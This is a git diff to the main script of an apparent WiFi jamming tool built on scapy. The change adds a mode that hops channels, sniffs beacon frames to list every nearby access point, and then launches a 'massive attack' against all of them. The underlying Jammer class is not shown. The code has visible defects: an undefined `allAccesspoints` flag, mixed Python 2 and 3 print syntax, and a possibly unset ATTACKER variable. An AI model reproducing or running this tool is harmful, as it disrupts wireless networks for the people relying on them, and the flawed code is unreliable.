@@ -1,8 +1,8 @@
 import argparse
-from multiprocessing import Process
 import signal
 import logging
 from Jammer import Jammer
+from multiprocessing import Process
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -42,25 +42,53 @@ def main():
 
     JAMMER = Jammer(ARGS.interface)
 
-    print("Press CTRL+C to stop sniffing...")
-    print("="*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID','BSSID') + '='*100)
+    if not allAccesspoints:
+        print("Press CTRL+C to stop sniffing...")
+        print("="*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID','BSSID') + '='*100)
 
-    HOPER = JAMMER.get_channel_hop_process()
-    HOPER.start()
+        # HOPER jumps in wifi channels
+        HOPER = JAMMER.get_channel_hop_process()
+        HOPER.start()
 
-    JAMMER.sniff()
+        # Jammer.sniff filters beacon packages to find access points
+        JAMMER.sniff()
 
-    signal.signal(signal.SIGINT, stopHopper)
+        signal.signal(signal.SIGINT, stopHopper)
 
-    ATTACKER = JAMMER.selectBSSID()
-    ATTACKER.start()
+        ATTACKER = JAMMER.selectBSSID()
+        ATTACKER.start()
+
+    else:
+        ## creates Hoper and Sniffer processes to scan all available AP
+        Hoper = JAMMER.get_channel_hop_cycle_process()
+        Hoper.start()
+
+        Sniffer = Process(target= JAMMER.sniff)
+        Sniffer.start()
+
+        # While the proccess doesn't finish it will be in the cycle
+        while not JAMMER.get_stop_sniff():
+            print "."
+
+        #Once the process finishes and we have saved all the AP terminate the process and start the massive attack
+        Hoper.terminate()
+        Hoper.join()
+        Sniffer.terminate()
+        Sniffer.join()
+
+        ## Starts massive attack
+        Attacker = Process(target = JAMMER.attackBSSID)
+        Attacker.start()
+
 
     signal.signal(signal.SIGINT, exit)
 
+
 def exit(m_signal, frame):
     JAMMER.stop_attack()
-    ATTACKER.terminate()
-    ATTACKER.join()
+    if ATTACKER:
+        ATTACKER.terminate()
+        ATTACKER.join()
 
 if __name__ == "__main__":
     main()
